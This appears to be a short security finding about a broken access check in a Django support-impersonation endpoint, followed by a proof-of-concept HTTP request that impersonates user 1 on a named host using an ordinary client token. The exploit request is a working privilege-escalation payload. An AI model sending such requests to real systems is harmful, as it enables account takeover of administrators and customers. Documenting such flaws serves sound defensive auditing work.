diagnosis: initiate_support_impersonation invokes django-hijack's login_user helper for an arbitrary user_id. Because the endpoint does not verify that the authenticated caller has superuser privileges or staff support roles, any logged-in user can impersonate platform administrators, senior executives, or other customers.
exploit_request:
POST /api/support/impersonate/1/ HTTP/1.1
Host: portal.cloudcrm.com
Authorization: Bearer untrusted_client_jwt
Content-Length: 0
